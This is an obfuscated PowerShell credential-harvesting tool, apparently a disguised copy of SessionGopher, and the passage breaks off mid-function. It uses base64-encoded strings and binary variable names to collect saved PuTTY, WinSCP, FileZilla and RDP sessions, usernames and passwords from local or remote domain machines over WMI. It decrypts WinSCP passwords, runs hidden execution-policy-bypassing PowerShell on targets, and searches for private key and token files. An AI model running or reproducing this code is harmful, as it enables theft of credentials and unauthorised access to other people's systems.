function SeGopher { param ( [switch]$o, [switch]$Thorough, [string]$u, [string]$p, [string]$iL, [string]$Target, [switch]$AllDomain ) echo 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAgACAAIAAgACAAIAAgACAAIAAgAG8AXwAgACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAALwAgACAAIgAuACAAIAAgAAoAIAAgACAAIAAgACAAIAAsACIAIAAgAF8ALQAiACAAIAAgACAAIAAgAAoAIAAgACAAIAAgACwAIgAgACAAIABtACAAbQAgACAAIAAgACAAIAAgACAAIAAKACAAIAAuAC4AKwAgACAAIAAgACAAKQAgACAAIAAgACAAIAAKACAAIAAgACAAIABgAG0ALgAuAG0AIAAgACAAIAAgACAAIAAKACAAIAA='))) 
  if ($o) {
    ${10101001001011011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AdABlAHIAIAAoAA=='))) + (Get-Date -Format 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABIAC4AbQBtAC4AcwBzAA==')))) + ")" ni -ItemType Directory ${10101001001011011} | Out-Null ni 
    (${10101001001011011} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -Type File | Out-Null ni (${10101001001011011} 
    + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAHUAcABlAHIAUAB1AFQAVABZAC4AYwBzAHYA')))) -Type File | Out-Null ni (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -Type File | Out-Null ni (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABGAGkAbABlAFoAaQBsAGwAYQAuAGMAcwB2AA==')))) -Type File | Out-Null ni (${10101001001011011} + 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -Type File | Out-Null if ($Thorough) {
        ni (${10101001001011011} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -Type File | 
        Out-Null ni (${10101001001011011} + 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -Type File | Out-Null ni 
        (${10101001001011011} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -Type File | 
        Out-Null
    }
  }
  if ($u -and $p) { ${_10001001010100011} = ConvertTo-SecureString $p -AsPlainText -Force ${00011111000001000} = New-Object -Typename System.Management.Automation.PSCredential 
    -ArgumentList $u, ${_10001001010100011}
  }
  ${10001011100100010} = 2147483651 ${10010111110111111} = 2147483650 ${10011100110100100} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABTAGkAbQBvAG4AVABhAHQAaABhAG0AXABQAHUAVABUAFkAXABTAGUAcwBzAGkAbwBuAHMA'))) 
  ${10010001010111000} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABNAGEAcgB0AGkAbgAgAFAAcgBpAGsAcgB5AGwAXABXAGkAbgBTAEMAUAAgADIAXABTAGUAcwBzAGkAbwBuAHMA'))) 
  ${10100100000100110} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAQwBsAGkAZQBuAHQAXABTAGUAcgB2AGUAcgBzAA=='))) 
  if ($iL -or $AllDomain -or $Target) {
    ${00011001111000110} = "" if ($AllDomain) { ${00011001111000110} = _01000111000111100
    } elseif ($iL) {
      ${00011001111000110} = gc ((rvpa $iL).Path)
    } elseif ($Target) {
      ${00011001111000110} = $Target
    }
    ${10111100110010001} = @{} if (${00011111000001000}) { 
      ${10111100110010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = ${00011111000001000}
    }
    foreach (${10111101000001111} in ${00011001111000110}) { if ($AllDomain) { ${10111101000001111} = ${10111101000001111}.Properties.name if (!${10111101000001111}) { 
        Continue }
      }
      Write-Host -NoNewLine -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHIAawBHAHIAZQBlAG4A'))) 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA='))) Write-Host 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGcAZwBpAG4AZwAgAG8AbgA='))) ${10111101000001111}"..." ${10010000010101111} = Invoke-WmiMethod 
      -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBLAGUAeQA='))) -ArgumentList ${10001011100100010},'' -ComputerName ${10111101000001111} 
      @10111100110010001 | select -ExpandProperty sNames | ? {$_ -match 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwBcAGQAXAAtAF0AKwAkAA==')))} foreach (${01100000001101101} in 
      ${10010000010101111}) {
        ${00110101011111111} = try { (Split-Path -Leaf (Split-Path -Leaf (_01011000110111000))) } catch {} ${00111110011110111} = ((${10111101000001111} + "\" + 
        ${00110101011111111}) -Join "") ${10000100110110100} = New-Object PSObject ${01111101100010010} = New-Object System.Collections.ArrayList ${01010111100000001} = 
        New-Object System.Collections.ArrayList ${10001101110101001} = New-Object System.Collections.ArrayList ${10111100100011001} = New-Object System.Collections.ArrayList 
        ${00010100001000100} = New-Object System.Collections.ArrayList ${10110000001101111} = ${01100000001101101} + ${10100100000100110} ${00011101000110001} = 
        ${01100000001101101} + ${10011100110100100} ${01010110101100110} = ${01100000001101101} + ${10010001010111000} ${10001010011100011} = 
        $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAD0AJwBDADoAJwAgAEEATgBEACAAUABhAHQAaAA9ACcAXABcAFUAcwBlAHIAcwBcAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwAXABEAG8AYwB1AG0AZQBuAHQAcwBcAFwAUwB1AHAAZQByAFAAdQBUAFQAWQBcAFwAJwAgAEEATgBEACAARgBpAGwAZQBOAGEAbQBlAD0AJwBTAGUAcwBzAGkAbwBuAHMAJwAgAEEATgBEACAARQB4AHQAZQBuAHMAaQBvAG4APQAnAFgATQBMACcA'))) 
        ${01111101101100101} = 
        $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAD0AJwBDADoAJwAgAEEATgBEACAAUABhAHQAaAA9ACcAXABcAFUAcwBlAHIAcwBcAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwAXABBAHAAcABEAGEAdABhAFwAXABSAG8AYQBtAGkAbgBnAFwAXABGAGkAbABlAFoAaQBsAGwAYQBcAFwAJwAgAEEATgBEACAARgBpAGwAZQBOAGEAbQBlAD0AJwBzAGkAdABlAG0AYQBuAGEAZwBlAHIAJwAgAEEATgBEACAARQB4AHQAZQBuAHMAaQBvAG4APQAnAFgATQBMACcA'))) 
        ${10101001000001110} = Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList 
        ${10001011100100010},${10110000001101111} @10111100110010001 ${10101100111011001} = Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList 
        ${10001011100100010},${00011101000110001} @10111100110010001 ${01010010010001110} = Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name EnumKey -ArgumentList 
        ${10001011100100010},${01010110101100110} @10111100110010001 ${10000011010100100} = (gwmi -Class 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter ${10001010011100011} -ComputerName ${10111101000001111} 
        @10111100110010001 | Select Name) ${01011001010011001} = (gwmi -Class 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter ${01111101101100101} -ComputerName ${10111101000001111} 
        @10111100110010001 | Select Name) if ((${01010010010001110} | select -ExpandPropert ReturnValue) -eq 0) {
          ${01010010010001110} = ${01010010010001110} | select -ExpandProperty sNames foreach (${00110111001000101} in ${01010010010001110}) { ${10101000000111100} = "" | 
            select -Property Source,Session,Hostname,Username,Password ${10101000000111100}.Source = ${00111110011110111} ${10101000000111100}.Session = ${00110111001000101} 
            ${01100011110101111} = ${01010110101100110} + "\" + ${00110111001000101} ${10101000000111100}.Hostname = (Invoke-WmiMethod -ComputerName ${10111101000001111} 
            -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList 
            ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABOAGEAbQBlAA=='))) @10111100110010001).sValue 
            ${10101000000111100}.Username = (Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList 
            ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) @10111100110010001).sValue 
            ${10101000000111100}.Password = (Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue -ArgumentList 
            ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))) @10111100110010001).sValue 
            if (${10101000000111100}.Password) {
              ${01000101111100100} = ${01100000001101101} + 
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABTAG8AZgB0AHcAYQByAGUAXABNAGEAcgB0AGkAbgAgAFAAcgBpAGsAcgB5AGwAXABXAGkAbgBTAEMAUAAgADIAXABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuAFwAUwBlAGMAdQByAGkAdAB5AA=='))) 
              ${10110011010010011} = (Invoke-WmiMethod -ComputerName ${10111101000001111} -Class 
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetDWordValue -ArgumentList 
              ${10001011100100010},${01000101111100100},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUATQBhAHMAdABlAHIAUABhAHMAcwB3AG8AcgBkAA=='))) 
              @10111100110010001).uValue if (!${10110011010010011}) {
                  ${10101000000111100}.Password = (_00111011011010000 ${10101000000111100}.Hostname ${10101000000111100}.Username ${10101000000111100}.Password)
              } else {
                  ${10101000000111100}.Password = 
                  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAHYAZQBkACAAaQBuACAAcwBlAHMAcwBpAG8AbgAsACAAYgB1AHQAIABtAGEAcwB0AGUAcgAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBlAHYAZQBuAHQAcwAgAHAAbABhAGkAbgB0AGUAeAB0ACAAcgBlAGMAbwB2AGUAcgB5AA==')))
              }
            }
            [void]${00010100001000100}.Add(${10101000000111100})
          } 
          if (${00010100001000100}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${00010100001000100} if ($o) {
              ${00010100001000100} | select * | Export-CSV -Append -Path (${10101001001011011} + 
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -NoTypeInformation
            } else {
              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) ${00010100001000100} | select * | fl | 
              Out-String
            }
          }
        } 
        if ((${10101100111011001} | select -ExpandPropert ReturnValue) -eq 0) { ${10101100111011001} = ${10101100111011001} | select -ExpandProperty sNames foreach 
          (${00000011011100001} in ${10101100111011001}) {
            ${00001111000011010} = "" | select -Property Source,Session,Hostname ${01100011110101111} = ${00011101000110001} + "\" + ${00000011011100001} 
            ${00001111000011010}.Source = ${00111110011110111} ${00001111000011010}.Session = ${00000011011100001} ${00001111000011010}.Hostname = (Invoke-WmiMethod 
            -ComputerName ${10111101000001111} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue 
            -ArgumentList ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABOAGEAbQBlAA=='))) 
            @10111100110010001).sValue [void]${01111101100010010}.Add(${00001111000011010})
          }
          if (${01111101100010010}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) -Value ${01111101100010010} if ($o) {
              ${01111101100010010} | select * | Export-CSV -Append -Path (${10101001001011011} + 
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -NoTypeInformation
            } else {
              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) ${01111101100010010} | select * | fl | 
              Out-String
            }
          }
        } 
        if ((${10101001000001110} | select -ExpandPropert ReturnValue) -eq 0) { ${10101001000001110} = ${10101001000001110} | select -ExpandProperty sNames foreach 
          (${01110100101010111} in ${10101001000001110}) {
            ${00011010011111100} = "" | select -Property Source,Hostname,Username ${01100011110101111} = ${10110000001101111} + "\" + ${01110100101010111} 
            ${00011010011111100}.Source = ${00111110011110111} ${00011010011111100}.Hostname = ${01110100101010111} ${00011010011111100}.Username = (Invoke-WmiMethod 
            -ComputerName ${10111101000001111} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name GetStringValue 
            -ArgumentList ${10001011100100010},${01100011110101111},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAEgAaQBuAHQA'))) 
            @10111100110010001).sValue [void]${10001101110101001}.Add(${00011010011111100})
          }
          if (${10001101110101001}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${10001101110101001} if ($o) {
              ${10001101110101001} | select * | Export-CSV -Append -Path (${10101001001011011} + 
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -NoTypeInformation
            } else {
              echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAFMAZQBzAHMAaQBvAG4AcwA='))) ${10001101110101001} | 
              select * | fl | Out-String
            }
          }
        } 
        if (${10000011010100100}.Name) { ${_01011100110011110} = 
          $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwARABvAGMAdQBtAGUAbgB0AHMAXABTAHUAcABlAHIAUAB1AFQAVABZAFwAUwBlAHMAcwBpAG8AbgBzAC4AeABtAGwA'))) 
          ${01100111110001000} = _10000010000000010 ${_01011100110011110} [xml]${_10100100011100010} = ${01100111110001000} (_01110101110100101 ${_10100100011100010})
        }
        if (${01011001010011001}.Name) { ${_01011100110011110} = 
          $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABGAGkAbABlAFoAaQBsAGwAYQBcAHMAaQB0AGUAbQBhAG4AYQBnAGUAcgAuAHgAbQBsAA=='))) 
          ${01100111110001000} = _10000010000000010 ${_01011100110011110} [xml]${_01110110011100001} = ${01100111110001000} (_01111010001110000 ${_01110110011100001})
        } 
      } 
      if ($Thorough) { ${10100011010111001} = New-Object System.Collections.ArrayList ${00011101111001111} = New-Object System.Collections.ArrayList ${01110111110000000} = 
        New-Object System.Collections.ArrayList ${_01100111100111011} = (gwmi -Class 
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR 
        extension='.sdtid'" -ComputerName ${10111101000001111} @10111100110010001 | Select Name) (_00111100110111100 ${_01100111100111011})
      } 
    } 
  } else {
    Write-Host -NoNewLine -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHIAawBHAHIAZQBlAG4A'))) 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA='))) Write-Host 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGcAZwBpAG4AZwAgAG8AbgA=')))(Hostname)$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))) 
    ${00111001110010111} = ls Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | ? {$_.Name -match 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBIAEsARQBZAF8AVQBTAEUAUgBTAFwAXABTAC0AMQAtADUALQAyADEALQBbAFwAZABcAC0AXQArACQA')))} 
    foreach(${10000101101010100} in ${00111001110010111}) {
      ${10000100110110100} = New-Object PSObject ${00010100001000100} = New-Object System.Collections.ArrayList ${01111101100010010} = New-Object System.Collections.ArrayList 
      ${10100011010111001} = New-Object System.Collections.ArrayList ${01010111100000001} = New-Object System.Collections.ArrayList ${10001101110101001} = New-Object 
      System.Collections.ArrayList ${00011101111001111} = New-Object System.Collections.ArrayList ${10111100100011001} = New-Object System.Collections.ArrayList 
      ${00010010000000011} = (_01011000110111000) ${00111110011110111} = (Hostname) + "\" + (Split-Path ${00010010000000011}.Value -Leaf) ${10000100110110100} | Add-Member 
      -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))) -Value ${00010010000000011}.Value 
      ${00011101000110001} = Join-Path ${10000101101010100}.PSPath 
      $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsAMQAwADAAMQAxADEAMAAwADEAMQAwADEAMAAwADEAMAAwAH0A'))) 
      ${01010110101100110} = Join-Path ${10000101101010100}.PSPath 
      $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsAMQAwADAAMQAwADAAMAAxADAAMQAwADEAMQAxADAAMAAwAH0A'))) 
      ${01111111010111001} = Join-Path ${10000101101010100}.PSPath 
      $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsAMQAwADEAMAAwADEAMAAwADAAMAAwADEAMAAwADEAMQAwAH0A'))) 
      ${01011001010011001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwA'))) + (Split-Path -Leaf ${10000100110110100}."Source") 
      + 
      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAEYAaQBsAGUAWgBpAGwAbABhAFwAcwBpAHQAZQBtAGEAbgBhAGcAZQByAC4AeABtAGwA'))) 
      ${10000011010100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwA'))) + (Split-Path -Leaf ${10000100110110100}."Source") 
      + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABEAG8AYwB1AG0AZQBuAHQAcwBcAFMAdQBwAGUAcgBQAHUAVABUAFkAXABTAGUAcwBzAGkAbwBuAHMALgB4AG0AbAA='))) if 
      (Test-Path ${01011001010011001}) {
        [xml]${_01110110011100001} = gc ${01011001010011001} (_01111010001110000 ${_01110110011100001})
      }
      if (Test-Path ${10000011010100100}) { [xml]${_10100100011100010} = gc ${10000011010100100} (_01110101110100101 ${_10100100011100010})
      }
      if (Test-Path ${01111111010111001}) { ${_01010010110101111} = ls ${01111111010111001} (_01000111010101101 ${_01010010110101111})
      } 
      if (Test-Path ${01010110101100110}) { ${_01001100010111010} = ls ${01010110101100110} (_10000100100101100 ${_01001100010111010})
      } 
      if (Test-Path ${00011101000110001}) { ${_00000010111110000} = ls ${00011101000110001} (_01100001110111011 ${_00000010111110000})
      } 
    } 
    if ($Thorough) { ${_10001100001011101} = New-Object System.Collections.ArrayList ${_00111011000101000} = New-Object System.Collections.ArrayList ${_10101111001001101} = 
      New-Object System.Collections.ArrayList ${_01111000011111111} = gdr (_01110101011000100 ${_01111000011111111}) (_00101010010011101 ${_10001100001011101}) 
      (_01001011101110110 ${_00111011000101000}) (_10101010000011011 ${_10101111001001101})
    } 
  } 
} 
function _01011000110111000 { if ($iL -or $Target -or $AllDomain) { ${00001011001101110} = 
    $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUAByAG8AZgBpAGwAZQBMAGkAcwB0AFwAJAB7ADAAMQAxADAAMAAwADAAMAAwADAAMQAxADAAMQAxADAAMQB9AA=='))) 
    ${01001100100000110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AZgBpAGwAZQBJAG0AYQBnAGUAUABhAHQAaAA='))) return (Invoke-WmiMethod 
    -ComputerName ${10111101000001111} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList 
    ${10010111110111111},${00001011001101110},${01001100100000110} @10111100110010001).sValue
  } else {
    ${01100000001101101} = (Split-Path ${10000101101010100}.Name -Leaf) ${10010100001001101} = New-Object 
    System.Security.Principal.SecurityIdentifier($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADAAMAAwADAAMAAwADAAMQAxADAAMQAxADAAMQB9AA==')))) 
    return ${10010100001001101}.Translate( [System.Security.Principal.NTAccount])
  }
}
function _10000010000000010(${_01011100110011110}) { ${10110110010000010} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABEAFIATQA='))) ${10101101011010111} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABNAGUA'))) ${00111001010010010} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABEAFIATQA='))) Write-Verbose 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABpAG4AZwAgAHIAZQBtAG8AdABlACAAZgBpAGwAZQAgAGEAbgBkACAAdwByAGkAdABpAG4AZwAgAG8AbgAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5AA=='))) 
  ${10101000000111000} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABmAGMAdAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGIAeQB0AGUAIAAtAFAAYQB0AGgAIAAnAA=='))) 
  + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADAAMQAxADEAMAAwADEAMQAwADAAMQAxADEAMQAwAH0A'))) + 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwA7ACAAJABmAGMAdABlAG4AYwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAYwB0ACkAOwAgAE4AZQB3AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAA='))) 
  + 
  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAkAHsAMQAwADEAMQAwADEAMQAwADAAMQAwADAAMAAwADAAMQAwAH0AJwA='))) 
  + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAE4AYQBtAGUAIAA='))) + 
  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAkAHsAMQAwADEAMAAxADEAMAAxADAAMQAxADAAMQAwADEAMQAxAH0AJwA='))) 
  + 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAFYAYQBsAHUAZQAgACQAZgBjAHQAZQBuAGMAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAUwB0AHIAaQBuAGcAIAAtAEYAbwByAGMAZQA='))) 
  ${10101000000111000} = 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIA'))) + 
  ${10101000000111000} + '"' $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist ${10101000000111000} -ComputerName ${10111101000001111} 
  @10111100110010001 sleep -s 15 ${01000111111001010} = "" ${01000111111001010} = Invoke-WmiMethod -Namespace 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${10010111110111111}, ${00111001010010010}, 
  ${10101101011010111} -Computer ${10111101000001111} @10111100110010001 ${01000101010110110} = [System.Convert]::FromBase64String(${01000111111001010}.sValue) 
  ${10111101000111100} = [System.Text.Encoding]::UTF8.GetString(${01000101010110110}) $null = Invoke-WmiMethod -Namespace 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAVgBhAGwAdQBlAA=='))) -Argumentlist $reghive, ${00111001010010010}, ${10101101011010111} 
  -ComputerName ${10111101000001111} @10111100110010001 return ${10111101000111100}
}
function _01110101011000100(${_01111000011111111}) { foreach (${00110000010111101} in ${_01111000011111111}) { if (${00110000010111101}.Provider.Name -eq 
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQA=')))) {
      ${00000111011010110} = ls ${00110000010111101}.Root -Recurse -ErrorAction SilentlyContinue foreach (${00001011000101110} in ${00000111011010110}) { Switch 
        (${00001011000101110}.Extension) {
          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHAAawA='))) {[void]${_10001100001011101}.Add(${00001011000101110})} 
